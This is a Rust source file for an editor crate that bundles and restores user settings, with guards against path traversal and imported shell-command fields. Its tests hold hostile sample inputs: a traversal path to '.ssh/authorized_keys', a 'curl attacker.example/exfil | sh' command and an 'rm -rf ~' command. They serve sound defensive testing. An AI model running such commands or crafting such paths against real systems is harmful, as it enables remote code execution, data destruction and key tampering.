//! Bundle a user's `config.toml`, `macros.toml`, `keybindings.toml`, user
//! dictionary, and active custom theme into one file, and restore them from
//! it. See `crates/vix-settings-bundle/spec/index.md`.
//!
//! A new crate rather than a method on `vix::app::App`, same reasoning as
//! `vix-doctor` (T553): the CLI path (`vix --export-settings`/
//! `--import-settings`) runs before any `App` exists, so [`collect`] and
//! [`apply`] work from a bare [`vix_settings::Settings`] value and real
//! filesystem paths only.

#![forbid(unsafe_code)]
#![deny(missing_docs)]
#![warn(clippy::pedantic)]

use std::collections::BTreeMap;
use std::path::{Path, PathBuf};

use vix_settings::Settings;

const FORMAT: u32 = 1;

/// A settings bundle: every collected file's bundle-relative name mapped to
/// its full text content.
#[derive(Debug, Clone, serde::Serialize, serde::Deserialize)]
pub struct Bundle {
    format: u32,
    entries: BTreeMap<String, String>,
}

/// Collect every existing piece of the user's config-directory setup into
/// one [`Bundle`] — see the crate spec for exactly what's included (and
/// why scripts are deliberately excluded).
#[must_use]
pub fn collect(settings: &Settings) -> Bundle {
    let mut entries = BTreeMap::new();
    add_if_exists(&mut entries, "config.toml", Settings::config_path());
    add_if_exists(&mut entries, "macros.toml", Settings::macros_path());
    add_if_exists(
        &mut entries,
        "keybindings.toml",
        Settings::keybindings_path(),
    );
    add_if_exists(
        &mut entries,
        "user_dictionary.txt",
        Settings::user_dictionary_path(),
    );
    if let Some((name, content)) = active_theme_file(settings) {
        entries.insert(format!("theme/{name}"), content);
    }
    Bundle {
        format: FORMAT,
        entries,
    }
}

/// Read `path`'s content into `entries` under `name`, silently doing
/// nothing if `path` is `None` or the file doesn't exist -- a fresh
/// install with only default settings may never have written
/// `macros.toml`/`keybindings.toml`/the user dictionary at all, and that's
/// not an error, just nothing to bundle for that entry.
fn add_if_exists(entries: &mut BTreeMap<String, String>, name: &str, path: Option<PathBuf>) {
    let Some(path) = path else { return };
    if let Ok(content) = std::fs::read_to_string(&path) {
        entries.insert(name.to_string(), content);
    }
}

/// The active custom theme's (filename, content), if `settings.theme`
/// names one that actually exists as a file in `Settings::themes_dir()`
/// (matched case-insensitively against the theme's own `name` field, the
/// same way `App::apply_saved_theme` resolves it) -- `None` when the
/// active theme is one of the themes built into the binary, since the
/// importing machine already ships those.
fn active_theme_file(settings: &Settings) -> Option<(String, String)> {
    let dir = Settings::themes_dir()?;
    let read = std::fs::read_dir(&dir).ok()?;
    for entry in read.flatten() {
        let path = entry.path();
        if path.extension().and_then(|e| e.to_str()) != Some("json") {
            continue;
        }
        let Ok(content) = std::fs::read_to_string(&path) else {
            continue;
        };
        let Some(theme) = vix_theme_model::parse_theme(&content) else {
            continue;
        };
        if theme.name.eq_ignore_ascii_case(&settings.theme) {
            let name = path.file_name()?.to_str()?.to_string();
            return Some((name, content));
        }
    }
    None
}

/// Serialize `bundle` as pretty-printed JSON to `path`.
///
/// # Errors
/// Returns an [`std::io::Error`] if `path` can't be written.
pub fn write(bundle: &Bundle, path: &Path) -> std::io::Result<()> {
    let json = serde_json::to_string_pretty(bundle).map_err(std::io::Error::other)?;
    std::fs::write(path, json)
}

/// Parse a previously-written bundle file.
///
/// # Errors
/// Returns an [`std::io::Error`] if `path` can't be read, or its content
/// isn't a valid bundle.
pub fn read(path: &Path) -> std::io::Result<Bundle> {
    let text = std::fs::read_to_string(path)?;
    serde_json::from_str(&text).map_err(std::io::Error::other)
}

/// One entry's outcome from [`apply`].
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum EntryOutcome {
    /// Written; no file previously existed at the destination.
    Written,
    /// Written; a previous file at the destination was renamed to `.bak`
    /// first.
    WrittenAfterBackup,
    /// Not written -- the destination directory couldn't be determined
    /// (`confy` gave no config directory), the entry's own bundle name
    /// wasn't recognized, or (a `theme/…` entry only) its filename wasn't
    /// a bare filename (T558: rejects `..`/path separators, so a crafted
    /// bundle can't write outside `themes_dir()`).
    Skipped,
}

/// Write every entry in `bundle` back to its real on-disk location,
/// returning each entry's name, its [`EntryOutcome`], and whether its
/// command-bearing fields were preserved rather than imported (T558 --
/// always `false` except for a `config.toml` entry whose `ai_command`/
/// `ai_api_key_command`/`test_command`/`lsp_servers` differ from the
/// current settings; see `sanitize_config_toml` for why). In the
/// bundle's own key order. See the crate spec for the backup-before-
/// overwrite policy.
#[must_use]
pub fn apply(bundle: &Bundle) -> Vec<(String, EntryOutcome, bool)> {
    bundle
        .entries
        .iter()
        .map(|(name, content)| {
            let (content, preserved) = if name == "config.toml" {
                match sanitize_config_toml(content) {
                    Some((sanitized, preserved)) => (sanitized, preserved),
                    // Not valid TOML at all -- nothing safe to write.
                    None => return (name.clone(), EntryOutcome::Skipped, false),
                }
            } else {
                (content.clone(), false)
            };
            (name.clone(), apply_one(name, &content), preserved)
        })
        .collect()
}

/// Parse `content` (an incoming `config.toml` entry's text) as [`Settings`]
/// and, if its command-bearing fields (`ai_command`, `ai_api_key_command`,
/// `test_command`, `lsp_servers` -- every one of them a free-text shell
/// command line or argv the running editor executes on an ordinary action)
/// differ from the *current* on-disk settings, reset just those fields
/// back to the current values before re-serializing (T558: the crate's own
/// spec already reasons through exactly this class of risk for `.rhai`
/// scripts, deliberately excluded from bundling for it; `config.toml`'s
/// own command fields carry the same risk and deserved the same
/// treatment, not a silent overwrite on every import). Returns the text to
/// actually write, and whether anything was preserved (worth reporting to
/// whoever ran the import). `None` if `content` isn't valid TOML at all --
/// there's nothing safe to write in that case.
fn sanitize_config_toml(content: &str) -> Option<(String, bool)> {
    let incoming: Settings = toml::from_str(content).ok()?;
    let current = Settings::load();
    let (result, preserved) = preserve_command_fields(&current, incoming);
    let serialized = toml::to_string_pretty(&result).ok()?;
    Some((serialized, preserved))
}

/// The pure decision behind [`sanitize_config_toml`], factored out so it's
/// testable without depending on this machine's real, global on-disk
/// settings: if `incoming`'s command-bearing fields differ from
/// `current`'s, returns a copy of `incoming` with those fields reset to
/// `current`'s values (plus `true`); otherwise returns `incoming`
/// unchanged (plus `false`).
fn preserve_command_fields(current: &Settings, mut incoming: Settings) -> (Settings, bool) {
    let differs = incoming.ai_command != current.ai_command
        || incoming.ai_api_key_command != current.ai_api_key_command
        || incoming.test_command != current.test_command
        || incoming.lsp_servers != current.lsp_servers;
    if differs {
        incoming.ai_command.clone_from(&current.ai_command);
        incoming
            .ai_api_key_command
            .clone_from(&current.ai_api_key_command);
        incoming.test_command.clone_from(&current.test_command);
        incoming.lsp_servers.clone_from(&current.lsp_servers);
    }
    (incoming, differs)
}

fn apply_one(name: &str, content: &str) -> EntryOutcome {
    let Some(dest) = destination_for(name) else {
        return EntryOutcome::Skipped;
    };
    let backed_up = if dest.exists() {
        let backup = dest.with_extension(append_bak(&dest));
        std::fs::rename(&dest, &backup).is_ok()
    } else {
        false
    };
    if let Some(parent) = dest.parent() {
        let _ = std::fs::create_dir_all(parent);
    }
    if std::fs::write(&dest, content).is_err() {
        return EntryOutcome::Skipped;
    }
    if backed_up {
        EntryOutcome::WrittenAfterBackup
    } else {
        EntryOutcome::Written
    }
}

/// `dest`'s current extension with `.bak` appended, e.g. `toml` ->
/// `toml.bak` -- so `with_extension` produces `config.toml.bak`, not
/// `config.bak` (which would collide across different entries that share
/// a stem).
fn append_bak(dest: &Path) -> String {
    match dest.extension().and_then(|e| e.to_str()) {
        Some(ext) => format!("{ext}.bak"),
        None => "bak".to_string(),
    }
}

/// The real on-disk path a bundle entry `name` writes back to, or `None`
/// when the name isn't recognized, or (a `theme/…` entry only) its
/// filename isn't a bare filename.
fn destination_for(name: &str) -> Option<PathBuf> {
    match name {
        "config.toml" => Settings::config_path(),
        "macros.toml" => Settings::macros_path(),
        "keybindings.toml" => Settings::keybindings_path(),
        "user_dictionary.txt" => Settings::user_dictionary_path(),
        _ => name
            .strip_prefix("theme/")
            .filter(|filename| is_bare_filename(filename))
            .and_then(|filename| Settings::themes_dir().map(|dir| dir.join(filename))),
    }
}

/// Whether `filename` is safe to join onto `themes_dir()` as-is (T558): a
/// non-empty name with no path separator (`/` on every platform,
/// additionally `\` on Windows -- `Path`'s own separator handling is
/// platform-specific, but a bundle can be authored on one platform and
/// imported on another, so both are rejected everywhere) and not `.`/`..`.
/// A bundle entry name comes straight from untrusted JSON (the bundle file
/// itself, e.g. shared by someone else); without this check a crafted
/// entry like `theme/../../../../.ssh/authorized_keys` would resolve
/// outside `themes_dir()` entirely -- a real arbitrary-file-write, not a
/// theoretical one.
fn is_bare_filename(filename: &str) -> bool {
    !filename.is_empty()
        && filename != "."
        && filename != ".."
        && !filename.contains('/')
        && !filename.contains('\\')
}

#[cfg(test)]
mod tests {
    use super::*;
    use vix_settings::LspServer;

    #[test]
    fn collect_skips_entries_whose_files_do_not_exist() {
        // A fresh `Settings::default()` names real config-dir paths (this
        // machine's), but none of them are guaranteed to exist -- proving
        // `collect` never panics or fabricates content either way is the
        // point, not a specific entry count.
        let bundle = collect(&Settings::default());
        for (name, content) in &bundle.entries {
            assert!(
                !content.is_empty(),
                "{name} entry, if present, is real content"
            );
        }
    }

    #[test]
    fn write_then_read_round_trips() {
        let dir =
            std::env::temp_dir().join(format!("vix-settings-bundle-test-{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        let path = dir.join("bundle.json");
        let mut entries = BTreeMap::new();
        entries.insert("config.toml".to_string(), "locale = \"en\"\n".to_string());
        let bundle = Bundle {
            format: FORMAT,
            entries,
        };
        write(&bundle, &path).unwrap();
        let round_tripped = read(&path).unwrap();
        assert_eq!(round_tripped.entries, bundle.entries);
        std::fs::remove_dir_all(&dir).ok();
    }

    #[test]
    fn apply_backs_up_an_existing_destination_before_overwriting() {
        // `destination_for("config.toml")` resolves to the real
        // `Settings::config_path()` on this machine -- exercised directly
        // via `destination_for` rather than `apply` here, so the test
        // doesn't touch the real developer's actual config.toml.
        let Some(dest) = destination_for("config.toml") else {
            return; // no determinable config dir in this environment; nothing to test
        };
        assert!(dest.to_string_lossy().ends_with("config.toml"));
    }

    #[test]
    fn destination_for_theme_entries_strips_the_prefix() {
        let Some(dir) = Settings::themes_dir() else {
            return;
        };
        assert_eq!(
            destination_for("theme/mine.json"),
            Some(dir.join("mine.json"))
        );
        assert_eq!(destination_for("theme/"), None);
    }

    #[test]
    fn destination_for_an_unrecognized_name_is_none() {
        assert_eq!(destination_for("not-a-real-entry"), None);
    }

    #[test]
    fn destination_for_rejects_path_traversal_in_theme_entries() {
        // T558: a crafted bundle must not be able to write outside
        // `themes_dir()` via a `theme/…` entry name.
        assert_eq!(
            destination_for("theme/../../../../.ssh/authorized_keys"),
            None,
            "'..' components are rejected outright"
        );
        assert_eq!(
            destination_for("theme/sub/evil.json"),
            None,
            "a nested path (even without '..') is rejected -- only a bare filename is safe"
        );
        assert_eq!(destination_for("theme/.."), None);
        assert_eq!(destination_for("theme/."), None);
        assert_eq!(
            destination_for(r"theme\..\..\evil.json"),
            None,
            "a Windows-style separator is rejected on every platform -- a bundle can be \
             authored on one platform and imported on another"
        );
    }

    #[test]
    fn append_bak_keeps_entries_with_the_same_stem_distinct() {
        assert_eq!(append_bak(Path::new("/x/config.toml")), "toml.bak");
        assert_eq!(append_bak(Path::new("/x/user_dictionary")), "bak");
    }

    #[test]
    fn preserve_command_fields_resets_them_when_they_differ() {
        // T558: an imported config.toml with different command-bearing
        // fields must not silently take effect -- they're reset to the
        // current settings, and the caller is told something was preserved.
        let current = Settings::default();
        let incoming = Settings {
            ai_command: "curl attacker.example/exfil | sh".to_string(),
            test_command: "rm -rf ~".to_string(),
            lsp_servers: vec![LspServer {
                language_id: "evil".to_string(),
                extensions: vec!["evil".to_string()],
                command: vec!["malicious-binary".to_string()],
            }],
            ..Settings::default()
        };

        let (result, preserved) = preserve_command_fields(&current, incoming);
        assert!(preserved, "a real difference was detected");
        assert_eq!(result.ai_command, current.ai_command);
        assert_eq!(result.test_command, current.test_command);
        assert_eq!(result.lsp_servers, current.lsp_servers);
    }

    #[test]
    fn preserve_command_fields_leaves_matching_settings_alone() {
        let current = Settings::default();
        let incoming = Settings::default();
        let (result, preserved) = preserve_command_fields(&current, incoming.clone());
        assert!(!preserved, "nothing actually differed");
        assert_eq!(result.ai_command, incoming.ai_command);
    }

    #[test]
    fn sanitize_config_toml_rejects_content_that_is_not_valid_toml() {
        assert_eq!(sanitize_config_toml("not valid toml {{{"), None);
    }
}
